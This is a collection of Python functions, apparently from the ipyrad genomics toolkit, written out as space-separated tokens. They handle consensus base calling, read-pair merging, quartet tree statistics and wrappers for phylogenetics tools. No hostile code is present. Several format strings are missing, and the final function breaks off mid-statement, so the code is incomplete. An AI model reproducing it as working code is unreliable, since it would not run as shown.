def get_subsamples ( data , samples , force ) : subsamples = [ ] for sample in samples : if not force : if sample . stats . state >= 5 : print ( . format ( sample . name ) ) elif not sample . stats . clusters_hidepth : print ( . format ( sample . name , int ( sample . stats . clusters_hidepth ) ) ) elif sample . stats . state < 4 : print ( . format ( sample . name ) ) else : subsamples . append ( sample ) else : if not sample . stats . clusters_hidepth : print ( . format ( sample . name , sample . files . clusters ) ) elif sample . stats . state < 4 : print ( . format ( sample . name ) ) else : subsamples . append ( sample ) if len ( subsamples ) == 0 : raise IPyradWarningExit ( ) ## if sample is already done skip if "hetero_est" not in data . stats : print ( "  No estimates of heterozygosity and error rate. Using default " "values" ) for sample in subsamples : sample . stats . hetero_est = 0.001 sample . stats . error_est = 0.0001 if data . _headers : print ( . format ( data . stats . error_est . mean ( ) , data . stats . error_est . std ( ) , data . stats . hetero_est . mean ( ) , data . stats . hetero_est . std ( ) ) ) return subsamples
def run ( data , samples , force , ipyclient ) : ## prepare dirs data . dirs . consens = os . path . join ( data . dirs . project , data . name + "_consens" ) if not os . path . exists ( data . dirs . consens ) : os . mkdir ( data . dirs . consens ) ## zap any tmp files that might be leftover tmpcons = glob . glob ( os . path . join ( data . dirs . consens , "*_tmpcons.*" ) ) tmpcats = glob . glob ( os . path . join ( data . dirs . consens , "*_tmpcats.*" ) ) for tmpfile in tmpcons + tmpcats : os . remove ( tmpfile ) ## filter through samples for those ready samples = get_subsamples ( data , samples , force ) ## set up parallel client: how many cores? lbview = ipyclient . load_balanced_view ( ) data . cpus = data . _ipcluster [ "cores" ] if not data . cpus : data . cpus = len ( ipyclient . ids ) ## wrap everything to ensure destruction of temp files inst = "" try : ## calculate depths, if they changed. samples = calculate_depths ( data , samples , lbview ) ## chunk clusters into bits for parallel processing lasyncs = make_chunks ( data , samples , lbview ) ## process chunks and cleanup process_chunks ( data , samples , lasyncs , lbview ) except KeyboardInterrupt as inst : raise inst finally : ## if process failed at any point delete tmp files tmpcons = glob . glob ( os . path . join ( data . dirs . clusts , "tmp_*.[0-9]*" ) ) tmpcons += glob . glob ( os . path . join ( data . dirs . consens , "*_tmpcons.*" ) ) tmpcons += glob . glob ( os . path . join ( data . dirs . consens , "*_tmpcats.*" ) ) for tmpchunk in tmpcons : os . remove ( tmpchunk ) ## Finished step 5. Set step 6 checkpoint to 0 to force ## re-running from scratch. data . _checkpoint = 0
def make_chunks ( data , samples , lbview ) : ## first progress bar start = time . time ( ) printstr = " chunking clusters     | {} | s5 |" elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 0 , printstr . format ( elapsed ) , spacer = data . _spacer ) ## send off samples to be chunked lasyncs = { } for sample in samples : lasyncs [ sample . name ] = lbview . apply ( chunk_clusters , * ( data , sample ) ) ## block until finished while 1 : ready = [ i . ready ( ) for i in lasyncs . values ( ) ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) if len ( ready ) == sum ( ready ) : print ( "" ) break ## check for failures for sample in samples : if not lasyncs [ sample . name ] . successful ( ) : LOGGER . error ( "  sample %s failed: %s" , sample . name , lasyncs [ sample . name ] . exception ( ) ) return lasyncs
def process_chunks ( data , samples , lasyncs , lbview ) : ## send chunks to be processed start = time . time ( ) asyncs = { sample . name : [ ] for sample in samples } printstr = " consens calling       | {} | s5 |" ## get chunklist from results for sample in samples : clist = lasyncs [ sample . name ] . result ( ) for optim , chunkhandle in clist : args = ( data , sample , chunkhandle , optim ) #asyncs[sample.name].append(lbview.apply_async(consensus, *args)) asyncs [ sample . name ] . append ( lbview . apply_async ( newconsensus , * args ) ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 0 , printstr . format ( elapsed ) , spacer = data . _spacer ) ## track progress allsyncs = list ( itertools . chain ( * [ asyncs [ i . name ] for i in samples ] ) ) while 1 : ready = [ i . ready ( ) for i in allsyncs ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) if len ( ready ) == sum ( ready ) : break ## get clean samples casyncs = { } for sample in samples : rlist = asyncs [ sample . name ] statsdicts = [ i . result ( ) for i in rlist ] casyncs [ sample . name ] = lbview . apply ( cleanup , * ( data , sample , statsdicts ) ) while 1 : ready = [ i . ready ( ) for i in casyncs . values ( ) ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 10 , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) if len ( ready ) == sum ( ready ) : print ( "" ) break ## check for failures: for key in asyncs : asynclist = asyncs [ key ] for async in asynclist : if not async . successful ( ) : LOGGER . error ( "  async error: %s \n%s" , key , async . exception ( ) ) for key in casyncs : if not casyncs [ key ] . successful ( ) : LOGGER . error ( "  casync error: %s \n%s" , key , casyncs [ key ] . exception ( ) ) ## get samples back subsamples = [ i . result ( ) for i in casyncs . values ( ) ] for sample in subsamples : data . samples [ sample . name ] = sample ## build Assembly stats data . stats_dfs . s5 = data . _build_stat ( "s5" ) ## write stats file data . stats_files . s5 = os . path . join ( data . dirs . consens , 's5_consens_stats.txt' ) with io . open ( data . stats_files . s5 , 'w' ) as out : #out.write(data.stats_dfs.s5.to_string()) data . stats_dfs . s5 . to_string ( buf = out , formatters = { 'clusters_total' : '{:.0f}' . format , 'filtered_by_depth' : '{:.0f}' . format , 'filtered_by_maxH' : '{:.0f}' . format , 'filtered_by_maxN' : '{:.0f}' . format , 'reads_consens' : '{:.0f}' . format , 'nsites' : '{:.0f}' . format , 'nhetero' : '{:.0f}' . format , 'heterozygosity' : '{:.5f}' . format } )
def make ( data , samples ) : #read in loci file outfile = open ( os . path . join ( data . dirs . outfiles , data . name + ".alleles" ) , 'w' ) lines = open ( os . path . join ( data . dirs . outfiles , data . name + ".loci" ) , 'r' ) ## Get the longest sample name for pretty printing longname = max ( len ( x ) for x in data . samples . keys ( ) ) ## Padding between name and sequence in output file. This should be the  ## same as write_outfiles.write_tmp_loci.name_padding name_padding = 5 writing = [ ] loc = 0 for line in lines : if ">" in line : name , seq = line . split ( " " ) [ 0 ] , line . split ( " " ) [ - 1 ] allele1 , allele2 = splitalleles ( seq . strip ( ) ) ## Format the output string. the "-2" below accounts for the additional ## 2 characters added to the sample name that don't get added to the ## snpsites line, so you gotta bump this line back 2 to make it ## line up right. writing . append ( name + "_0" + " " * ( longname - len ( name ) - 2 + name_padding ) + allele1 ) writing . append ( name + "_1" + " " * ( longname - len ( name ) - 2 + name_padding ) + allele2 ) else : writing . append ( line . strip ( ) ) loc += 1 ## print every 10K loci " if not loc % 10000 : outfile . write ( "\n" . join ( writing ) + "\n" ) writing = [ ] outfile . write ( "\n" . join ( writing ) ) outfile . close ( )
def cluster_info ( ipyclient , spacer = "" ) : ## get engine data, skips busy engines.     hosts = [ ] for eid in ipyclient . ids : engine = ipyclient [ eid ] if not engine . outstanding : hosts . append ( engine . apply ( _socket . gethostname ) ) ## report it hosts = [ i . get ( ) for i in hosts ] result = [ ] for hostname in set ( hosts ) : result . append ( "{}host compute node: [{} cores] on {}" . format ( spacer , hosts . count ( hostname ) , hostname ) ) print "\n" . join ( result )
def _set_debug_dict ( __loglevel__ ) : _lconfig . dictConfig ( { 'version' : 1 , 'disable_existing_loggers' : False , 'formatters' : { 'standard' : { 'format' : "%(asctime)s \t" + "pid=%(process)d \t" + "[%(filename)s]\t" + "%(levelname)s \t" + "%(message)s" } , } , 'handlers' : { __name__ : { 'level' : __loglevel__ , 'class' : 'logging.FileHandler' , 'filename' : __debugfile__ , 'formatter' : "standard" , 'mode' : 'a+' } } , 'loggers' : { __name__ : { 'handlers' : [ __name__ ] , 'level' : __loglevel__ , 'propogate' : True } } } )
def _debug_off ( ) : if _os . path . exists ( __debugflag__ ) : _os . remove ( __debugflag__ ) __loglevel__ = "ERROR" _LOGGER . info ( "debugging turned off" ) _set_debug_dict ( __loglevel__ )
def _cmd_exists ( cmd ) : return _subprocess . call ( "type " + cmd , shell = True , stdout = _subprocess . PIPE , stderr = _subprocess . PIPE ) == 0
def random_product ( iter1 , iter2 ) : iter4 = np . concatenate ( [ np . random . choice ( iter1 , 2 , replace = False ) , np . random . choice ( iter2 , 2 , replace = False ) ] ) return iter4
def get_total ( tots , node ) : if ( node . is_leaf ( ) or node . is_root ( ) ) : return 0 else : ## Get counts on down edges.  ## How to treat polytomies here? if len ( node . children ) > 2 : down_r = node . children [ 0 ] down_l = node . children [ 1 ] for child in node . children [ 2 : ] : down_l += child else : down_r , down_l = node . children lendr = sum ( 1 for i in down_r . iter_leaves ( ) ) lendl = sum ( 1 for i in down_l . iter_leaves ( ) ) ## get count on up edge sister up_r = node . get_sisters ( ) [ 0 ] lenur = sum ( 1 for i in up_r . iter_leaves ( ) ) ## everyone else lenul = tots - ( lendr + lendl + lenur ) ## return product return lendr * lendl * lenur * lenul
def get_sampled ( data , totn , node ) : ## convert tip names to ints names = sorted ( totn ) cdict = { name : idx for idx , name in enumerate ( names ) } ## skip some nodes if ( node . is_leaf ( ) or node . is_root ( ) ) : return 0 else : ## get counts on down edges if len ( node . children ) > 2 : down_r = node . children [ 0 ] down_l = node . children [ 1 ] for child in node . children [ 2 : ] : down_l += child else : down_r , down_l = node . children lendr = set ( cdict [ i ] for i in down_r . get_leaf_names ( ) ) lendl = set ( cdict [ i ] for i in down_l . get_leaf_names ( ) ) ## get count on up edge sister up_r = node . get_sisters ( ) [ 0 ] lenur = set ( cdict [ i ] for i in up_r . get_leaf_names ( ) ) ## everyone else lenul = set ( cdict [ i ] for i in totn ) - set . union ( lendr , lendl , lenur ) idx = 0 sampled = 0 with h5py . File ( data . database . output , 'r' ) as io5 : end = io5 [ "quartets" ] . shape [ 0 ] while 1 : ## break condition if idx >= end : break ## counts matches qrts = io5 [ "quartets" ] [ idx : idx + data . _chunksize ] for qrt in qrts : sqrt = set ( qrt ) if all ( [ sqrt . intersection ( i ) for i in [ lendr , lendl , lenur , lenul ] ] ) : sampled += 1 ## increase span idx += data . _chunksize return sampled
def _run_qmc ( self , boot ) : ## build command self . _tmp = os . path . join ( self . dirs , ".tmptre" ) cmd = [ ip . bins . qmc , "qrtt=" + self . files . qdump , "otre=" + self . _tmp ] ## run it proc = subprocess . Popen ( cmd , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) res = proc . communicate ( ) if proc . returncode : raise IPyradWarningExit ( res [ 1 ] ) ## parse tmp file written by qmc into a tree and rename it with open ( self . _tmp , 'r' ) as intree : tre = ete3 . Tree ( intree . read ( ) . strip ( ) ) names = tre . get_leaves ( ) for name in names : name . name = self . samples [ int ( name . name ) ] tmptre = tre . write ( format = 9 ) ## save the tree to file if boot : self . trees . boots = os . path . join ( self . dirs , self . name + ".boots" ) with open ( self . trees . boots , 'a' ) as outboot : outboot . write ( tmptre + "\n" ) else : self . trees . tree = os . path . join ( self . dirs , self . name + ".tree" ) with open ( self . trees . tree , 'w' ) as outtree : outtree . write ( tmptre ) ## save the file self . _save ( )
def _compute_stats ( self , start , ipyclient , quiet = False ) : ## get name indices names = self . samples ## make a consensus from bootstrap reps. if self . checkpoint . boots : tre = ete3 . Tree ( self . trees . tree , format = 0 ) tre . unroot ( ) with open ( self . trees . boots , 'r' ) as inboots : bb = [ ete3 . Tree ( i . strip ( ) , format = 0 ) for i in inboots . readlines ( ) ] bb = [ tre ] + bb ## calculate consensus supports ctre , counts = consensus_tree ( bb , names = names ) self . trees . cons = os . path . join ( self . dirs , self . name + ".cons" ) with open ( self . trees . cons , 'w' ) as ocons : ocons . write ( ctre . write ( format = 0 ) ) else : ctre = ete3 . Tree ( self . trees . tree , format = 0 ) ctre . unroot ( ) ## build stats file and write trees self . trees . nhx = os . path . join ( self . dirs , self . name + ".nhx" ) lbview = ipyclient . load_balanced_view ( ) qtots = { } qsamp = { } tots = sum ( 1 for i in ctre . iter_leaves ( ) ) totn = set ( ctre . get_leaf_names ( ) ) ## iterate over node traversal for node in ctre . traverse ( ) : ## this is slow, needs to look at every sampled quartet ## so we send it to be processed on engines qtots [ node ] = lbview . apply ( get_total , * ( tots , node ) ) qsamp [ node ] = lbview . apply ( get_sampled , * ( self , totn , node ) ) ## wait for jobs to finish (+1 to lenjob is for final progress printer) alljobs = qtots . values ( ) + qsamp . values ( ) lenjobs = len ( alljobs ) + 1 printstr = "calculating stats | {} | " done = 0 while 1 : if not quiet : done = sum ( [ i . ready ( ) for i in alljobs ] ) elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( lenjobs , done , printstr . format ( elapsed ) , spacer = "" ) if ( lenjobs - 1 ) == done : break else : time . sleep ( 0.1 ) ## store results in the tree object for node in ctre . traverse ( ) : total = qtots [ node ] . result ( ) sampled = qsamp [ node ] . result ( ) node . add_feature ( "quartets_total" , total ) node . add_feature ( "quartets_sampled" , sampled ) features = [ "quartets_total" , "quartets_sampled" ] ## update final progress elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 1 , 1 , printstr . format ( elapsed ) , spacer = "" ) if not quiet : print ( "" ) ## write tree in NHX format  with open ( self . trees . nhx , 'w' ) as outtre : outtre . write ( ctre . write ( format = 0 , features = features ) )
def _load ( self , name , workdir , quiet = False ) : ## load the JSON string and try with name+.json path = os . path . join ( workdir , name ) if not path . endswith ( ".tet.json" ) : path += ".tet.json" ## expand user path = path . replace ( "~" , os . path . expanduser ( "~" ) ) ## load the json file as a dictionary try : with open ( path , 'r' ) as infile : fullj = _byteify ( json . loads ( infile . read ( ) , object_hook = _byteify ) , ignore_dicts = True ) except IOError : raise IPyradWarningExit ( . format ( path ) ) ## set old attributes into new tetrad object self . name = fullj [ "name" ] self . files . data = fullj [ "files" ] [ "data" ] self . files . mapfile = fullj [ "files" ] [ "mapfile" ] self . dirs = fullj [ "dirs" ] self . _init_seqarray ( quiet = quiet ) self . _parse_names ( ) ## fill in the same attributes for key in fullj : ## fill Params a little different if key in [ "files" , "params" , "database" , "trees" , "stats" , "checkpoint" ] : filler = fullj [ key ] for ikey in filler : self . __dict__ [ key ] . __setattr__ ( ikey , fullj [ key ] [ ikey ] ) else : self . __setattr__ ( key , fullj [ key ] )
def _insert_to_array ( self , chunk , results ) : ## two result arrs chunksize = self . _chunksize qrts , invs = results ## enter into db with h5py . File ( self . database . output , 'r+' ) as io5 : io5 [ 'quartets' ] [ chunk : chunk + chunksize ] = qrts ## entered as 0-indexed ! if self . params . save_invariants : if self . checkpoint . boots : key = "invariants/boot{}" . format ( self . checkpoint . boots ) io5 [ key ] [ chunk : chunk + chunksize ] = invs else : io5 [ "invariants/boot0" ] [ chunk : chunk + chunksize ] = invs
def memoize ( func ) : class Memodict ( dict ) : """ just a dict""" def __getitem__ ( self , * key ) : return dict . __getitem__ ( self , key ) def __missing__ ( self , key ) : """ this makes it faster """ ret = self [ key ] = func ( * key ) return ret return Memodict ( ) . __getitem__
def comp ( seq ) : ## makes base to its small complement then makes upper return seq . replace ( "A" , 't' ) . replace ( 'T' , 'a' ) . replace ( 'C' , 'g' ) . replace ( 'G' , 'c' ) . replace ( 'n' , 'Z' ) . upper ( ) . replace ( "Z" , "n" )
def fastq_touchup_for_vsearch_merge ( read , outfile , reverse = False ) : counts = 0 with open ( outfile , 'w' ) as out : ## read in paired end read files 4 lines at a time if read . endswith ( ".gz" ) : fr1 = gzip . open ( read , 'rb' ) else : fr1 = open ( read , 'rb' ) quarts = itertools . izip ( * [ iter ( fr1 ) ] * 4 ) ## a list to store until writing writing = [ ] while 1 : try : lines = quarts . next ( ) except StopIteration : break if reverse : seq = lines [ 1 ] . strip ( ) [ : : - 1 ] else : seq = lines [ 1 ] . strip ( ) writing . append ( "" . join ( [ lines [ 0 ] , seq + "\n" , lines [ 2 ] , "B" * len ( seq ) ] ) ) ## write to disk counts += 1 if not counts % 1000 : out . write ( "\n" . join ( writing ) + "\n" ) writing = [ ] if writing : out . write ( "\n" . join ( writing ) ) out . close ( ) fr1 . close ( )
def merge_pairs_after_refmapping ( data , two_files , merged_out ) : ## create temp files  nonmerged1 = tempfile . NamedTemporaryFile ( mode = 'wb' , dir = data . dirs . edits , suffix = "_nonmerged_R1_.fastq" ) . name nonmerged2 = tempfile . NamedTemporaryFile ( mode = 'wb' , dir = data . dirs . edits , suffix = "_nonmerged_R2_.fastq" ) . name ## get the maxn and minlen values minlen = str ( max ( 32 , data . paramsdict [ "filter_min_trim_len" ] ) ) try : maxn = sum ( data . paramsdict [ 'max_low_qual_bases' ] ) except TypeError : maxn = data . paramsdict [ 'max_low_qual_bases' ] ## set the quality scores abritrarily high and orient R2 correctly tmp1 = two_files [ 0 ] [ 0 ] tmp2 = two_files [ 0 ] [ 1 ] fastq_touchup_for_vsearch_merge ( tmp1 , tmp1 + ".tu" , False ) fastq_touchup_for_vsearch_merge ( tmp2 , tmp2 + ".tu" , True ) ## command string to call vsearch cmd = [ ipyrad . bins . vsearch , "--fastq_mergepairs" , tmp1 + ".tu" , "--reverse" , tmp2 + ".tu" , "--fastqout" , merged_out , "--fastqout_notmerged_fwd" , nonmerged1 , "--fastqout_notmerged_rev" , nonmerged2 , "--fasta_width" , "0" , "--fastq_minmergelen" , minlen , "--fastq_maxns" , str ( maxn ) , "--fastq_minovlen" , "10" , "--fastq_maxdiffs" , "4" , "--label_suffix" , "_m1" , "--fastq_qmax" , "1000" , "--threads" , "2" , "--fastq_allowmergestagger" ] ## run vsearch but allow kbd proc = sps . Popen ( cmd , stderr = sps . STDOUT , stdout = sps . PIPE ) try : res = proc . communicate ( ) [ 0 ] except KeyboardInterrupt : proc . kill ( ) ## cleanup tmp files if job failed or stopped     if proc . returncode : LOGGER . error ( "Error: %s %s" , cmd , res ) raise IPyradWarningExit ( "Error merge pairs:\n %s\n%s" , cmd , res ) ## record how many read pairs were merged with open ( merged_out , 'r' ) as tmpf : nmerged = sum ( 1 for i in tmpf . readlines ( ) ) // 4 ## Concat unmerged pairs with a 'nnnn' separator with open ( merged_out , 'ab' ) as combout : ## read in paired end read files 4 lines at a time fr1 = open ( nonmerged1 , 'rb' ) quart1 = itertools . izip ( * [ iter ( fr1 ) ] * 4 ) fr2 = open ( nonmerged2 , 'rb' ) quart2 = itertools . izip ( * [ iter ( fr2 ) ] * 4 ) quarts = itertools . izip ( quart1 , quart2 ) ## a list to store until writing writing = [ ] counts = 0 ## iterate until done while 1 : try : read1s , read2s = quarts . next ( ) except StopIteration : break ## store the read writing . append ( "" . join ( [ read1s [ 0 ] , read1s [ 1 ] . strip ( ) + "nnnn" + read2s [ 1 ] , read1s [ 2 ] , read1s [ 3 ] . strip ( ) + "nnnn" + read2s [ 3 ] , ] ) ) ## count up until time to write counts += 1 if not counts % 10 : combout . write ( "" . join ( writing ) ) writing = [ ] ## write the remaining if writing : combout . write ( "" . join ( writing ) ) ## close handles fr1 . close ( ) fr2 . close ( ) combout . close ( ) ## remove temp files (or do this later) rmfiles = [ nonmerged1 , nonmerged2 , tmp1 , tmp2 , tmp1 + ".tu" , tmp2 + ".tu" ] for rmfile in rmfiles : if os . path . exists ( rmfile ) : os . remove ( rmfile ) return nmerged
def revcomp ( sequence ) : sequence = sequence [ : : - 1 ] . strip ( ) . replace ( "A" , "t" ) . replace ( "T" , "a" ) . replace ( "C" , "g" ) . replace ( "G" , "c" ) . upper ( ) return sequence
def clustdealer ( pairdealer , optim ) : ccnt = 0 chunk = [ ] while ccnt < optim : ## try refreshing taker, else quit try : taker = itertools . takewhile ( lambda x : x [ 0 ] != "//\n" , pairdealer ) oneclust = [ "" . join ( taker . next ( ) ) ] except StopIteration : #LOGGER.debug('last chunk %s', chunk) return 1 , chunk ## load one cluster while 1 : try : oneclust . append ( "" . join ( taker . next ( ) ) ) except StopIteration : break chunk . append ( "" . join ( oneclust ) ) ccnt += 1 return 0 , chunk
def progressbar ( njobs , finished , msg = "" , spacer = "  " ) : if njobs : progress = 100 * ( finished / float ( njobs ) ) else : progress = 100 hashes = '#' * int ( progress / 5. ) nohash = ' ' * int ( 20 - len ( hashes ) ) if not ipyrad . __interactive__ : msg = msg . rsplit ( "|" , 2 ) [ 0 ] args = [ spacer , hashes + nohash , int ( progress ) , msg ] print ( "\r{}[{}] {:>3}% {} " . format ( * args ) , end = "" ) sys . stdout . flush ( )
def get_threaded_view ( ipyclient , split = True ) : ## engine ids ## e.g., [0, 1, 2, 3, 4, 5, 6, 7, 8] eids = ipyclient . ids ## get host names ## e.g., ['a', 'a', 'b', 'b', 'a', 'c', 'c', 'c', 'c'] dview = ipyclient . direct_view ( ) hosts = dview . apply_sync ( socket . gethostname ) ## group ids into a dict by their hostnames ## e.g., {a: [0, 1, 4], b: [2, 3], c: [5, 6, 7, 8]} hostdict = defaultdict ( list ) for host , eid in zip ( hosts , eids ) : hostdict [ host ] . append ( eid ) ## Now split threads on the same host into separate proc if there are many hostdictkeys = hostdict . keys ( ) for key in hostdictkeys : gids = hostdict [ key ] maxt = len ( gids ) if len ( gids ) >= 4 : maxt = 2 ## if 4 nodes and 4 ppn, put one sample per host if ( len ( gids ) == 4 ) and ( len ( hosts ) >= 4 ) : maxt = 4 if len ( gids ) >= 6 : maxt = 3 if len ( gids ) >= 8 : maxt = 4 if len ( gids ) >= 16 : maxt = 4 ## split ids into groups of maxt threaded = [ gids [ i : i + maxt ] for i in xrange ( 0 , len ( gids ) , maxt ) ] lth = len ( threaded ) ## if anything was split (lth>1) update hostdict with new proc if lth > 1 : hostdict . pop ( key ) for hostid in range ( lth ) : hostdict [ str ( key ) + "_" + str ( hostid ) ] = threaded [ hostid ] ## make sure split numbering is correct #threaded = hostdict.values() #assert len(ipyclient.ids) <= len(list(itertools.chain(*threaded))) LOGGER . info ( "threaded_view: %s" , dict ( hostdict ) ) return hostdict
def _call_structure ( mname , ename , sname , name , workdir , seed , ntaxa , nsites , kpop , rep ) : ## create call string outname = os . path . join ( workdir , "{}-K-{}-rep-{}" . format ( name , kpop , rep ) ) cmd = [ "structure" , "-m" , mname , "-e" , ename , "-K" , str ( kpop ) , "-D" , str ( seed ) , "-N" , str ( ntaxa ) , "-L" , str ( nsites ) , "-i" , sname , "-o" , outname ] ## call the shell function proc = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . STDOUT ) comm = proc . communicate ( ) ## cleanup oldfiles = [ mname , ename , sname ] for oldfile in oldfiles : if os . path . exists ( oldfile ) : os . remove ( oldfile ) return comm
def _get_clumpp_table ( self , kpop , max_var_multiple , quiet ) : ## concat results for k=x reps , excluded = _concat_reps ( self , kpop , max_var_multiple , quiet ) if reps : ninds = reps [ 0 ] . inds nreps = len ( reps ) else : ninds = nreps = 0 if not reps : return "no result files found" clumphandle = os . path . join ( self . workdir , "tmp.clumppparams.txt" ) self . clumppparams . kpop = kpop self . clumppparams . c = ninds self . clumppparams . r = nreps with open ( clumphandle , 'w' ) as tmp_c : tmp_c . write ( self . clumppparams . _asfile ( ) ) ## create CLUMPP args string outfile = os . path . join ( self . workdir , "{}-K-{}.outfile" . format ( self . name , kpop ) ) indfile = os . path . join ( self . workdir , "{}-K-{}.indfile" . format ( self . name , kpop ) ) miscfile = os . path . join ( self . workdir , "{}-K-{}.miscfile" . format ( self . name , kpop ) ) cmd = [ "CLUMPP" , clumphandle , "-i" , indfile , "-o" , outfile , "-j" , miscfile , "-r" , str ( nreps ) , "-c" , str ( ninds ) , "-k" , str ( kpop ) ] ## call clumpp proc = subprocess . Popen ( cmd , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) _ = proc . communicate ( ) ## cleanup for rfile in [ indfile , miscfile ] : if os . path . exists ( rfile ) : os . remove ( rfile ) ## parse clumpp results file ofile = os . path . join ( self . workdir , "{}-K-{}.outfile" . format ( self . name , kpop ) ) if os . path . exists ( ofile ) : csvtable = pd . read_csv ( ofile , delim_whitespace = True , header = None ) table = csvtable . loc [ : , 5 : ] ## apply names to cols and rows table . columns = range ( table . shape [ 1 ] ) table . index = self . labels if not quiet : sys . stderr . write ( "[K{}] {}/{} results permuted across replicates (max_var={}).\n" . format ( kpop , nreps , nreps + excluded , max_var_multiple ) ) return table else : sys . stderr . write ( "No files ready for {}-K-{} in {}\n" . format ( self . name , kpop , self . workdir ) ) return
def result_files ( self ) : reps = OPJ ( self . workdir , self . name + "-K-*-rep-*_f" ) repfiles = glob . glob ( reps ) return repfiles
def parse ( self , psearch , dsearch ) : stable = "" with open ( self . repfile ) as orep : dat = orep . readlines ( ) for line in dat : ## stat lines if "Estimated Ln Prob of Data" in line : self . est_lnlik = float ( line . split ( ) [ - 1 ] ) if "Mean value of ln likelihood" in line : self . mean_lnlik = float ( line . split ( ) [ - 1 ] ) if "Variance of ln likelihood" in line : self . var_lnlik = float ( line . split ( ) [ - 1 ] ) if "Mean value of alpha" in line : self . alpha = float ( line . split ( ) [ - 1 ] ) ## matrix lines nonline = psearch . search ( line ) popline = dsearch . search ( line ) #if ")   :  " in line: if nonline : ## check if sample is supervised... abc = line . strip ( ) . split ( ) outstr = "{}{}{}" . format ( " " . join ( [ abc [ 0 ] , abc [ 0 ] , abc [ 2 ] , abc [ 0 ] . split ( '.' ) [ 0 ] ] ) , " :  " , " " . join ( abc [ 4 : ] ) ) self . inds += 1 stable += outstr + "\n" elif popline : ## check if sample is supervised... abc = line . strip ( ) . split ( ) prop = [ "0.000" ] * self . kpop pidx = int ( abc [ 3 ] ) - 1 prop [ pidx ] = "1.000" outstr = "{}{}{}" . format ( " " . join ( [ abc [ 0 ] , abc [ 0 ] , abc [ 2 ] , abc [ 0 ] . split ( '.' ) [ 0 ] ] ) , " :  " , " " . join ( prop ) ) self . inds += 1 stable += outstr + "\n" stable += "\n" return stable
def _call_raxml ( command_list ) : proc = subprocess . Popen ( command_list , stderr = subprocess . STDOUT , stdout = subprocess . PIPE ) comm = proc . communicate ( ) return comm
def _command_list ( self ) : cmd = [ self . params . binary , "-f" , str ( self . params . f ) , "-T" , str ( self . params . T ) , "-m" , str ( self . params . m ) , "-N" , str ( self . params . N ) , "-x" , str ( self . params . x ) , "-p" , str ( self . params . p ) , "-n" , str ( self . params . n ) , "-w" , str ( self . params . w ) , "-s" , str ( self . params . s ) , ] ## add ougroups if self . params . o : cmd += [ "-o" ] cmd += [ "," . join ( self . params . o ) ] return cmd
def batch ( baba , ipyclient = None , ) : ## parse args handle = baba . data taxdicts = baba . tests mindicts = baba . params . mincov nboots = baba . params . nboots ## if ms generator make into reusable list sims = 0 if isinstance ( handle , types . GeneratorType ) : handle = list ( handle ) sims = 1 else : ## expand locifile path to full path handle = os . path . realpath ( handle ) ## parse taxdicts into names and lists if it a dictionary #if isinstance(taxdicts, dict): #    names, taxdicts = taxdicts.keys(), taxdicts.values() #else: #    names = [] names = [ ] if isinstance ( taxdicts , dict ) : taxdicts = [ taxdicts ] ## an array to hold results (len(taxdicts), nboots) tot = len ( taxdicts ) resarr = np . zeros ( ( tot , 7 ) , dtype = np . float64 ) bootsarr = np . zeros ( ( tot , nboots ) , dtype = np . float64 ) paneldict = { } ## TODO: Setup a wrapper to find and cleanup ipyclient ## define the function and parallelization to use,  ## if no ipyclient then drops back to using multiprocessing. if not ipyclient : # ipyclient = ip.core.parallel.get_client(**self._ipcluster) raise IPyradError ( "you must enter an ipyparallel.Client() object" ) else : lbview = ipyclient . load_balanced_view ( ) ## submit jobs to run on the cluster queue start = time . time ( ) asyncs = { } idx = 0 ## prepare data before sending to engines ## if it's a str (locifile) then parse it here just once. if isinstance ( handle , str ) : with open ( handle , 'r' ) as infile : loci = infile . read ( ) . strip ( ) . split ( "|\n" ) if isinstance ( handle , list ) : pass #sims() ## iterate over tests (repeats mindicts if fewer than taxdicts) itests = iter ( taxdicts ) imdict = itertools . cycle ( [ mindicts ] ) #for test, mindict in zip(taxdicts, itertools.cycle([mindicts])): for i in xrange ( len ( ipyclient ) ) : ## next entries unless fewer than len ipyclient, skip try : test = next ( itests ) mindict = next ( imdict ) except StopIteration : continue ## if it's sim data then convert to an array if sims : loci = _msp_to_arr ( handle , test ) args = ( loci , test , mindict , nboots ) print ( "not yet implemented" ) #asyncs[idx] = lbview.apply_async(dstat, *args) else : args = [ loci , test , mindict , nboots ] asyncs [ idx ] = lbview . apply ( dstat , * args ) idx += 1 ## block until finished, print progress if requested. finished = 0 try : while 1 : keys = [ i for ( i , j ) in asyncs . items ( ) if j . ready ( ) ] ## check for failures for job in keys : if not asyncs [ job ] . successful ( ) : raise IPyradWarningExit ( " error: {}: {}" . format ( job , asyncs [ job ] . exception ( ) ) ) ## enter results for successful jobs else : _res , _bot = asyncs [ job ] . result ( ) ## store D4 results if _res . shape [ 0 ] == 1 : resarr [ job ] = _res . T . as_matrix ( ) [ : , 0 ] bootsarr [ job ] = _bot ## or store D5 results                         else : paneldict [ job ] = _res . T ## remove old job del asyncs [ job ] finished += 1 ## submit next job if there is one. try : test = next ( itests ) mindict = next ( imdict ) if sims : loci = _msp_to_arr ( handle , test ) args = ( loci , test , mindict , nboots ) print ( "not yet implemented" ) #asyncs[idx] = lbview.apply_async(dstat, *args) else : args = [ loci , test , mindict , nboots ] asyncs [ idx ] = lbview . apply ( dstat , * args ) idx += 1 except StopIteration : pass ## count finished and break if all are done. #fin = idx - len(asyncs) elap = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) printstr = " calculating D-stats  | {} | " progressbar ( tot , finished , printstr . format ( elap ) , spacer = "" ) time . sleep ( 0.1 ) if not asyncs : print ( "" ) break except KeyboardInterrupt as inst : ## cancel all jobs (ipy & multiproc modes) and then raise error try : ipyclient . abort ( ) except Exception : 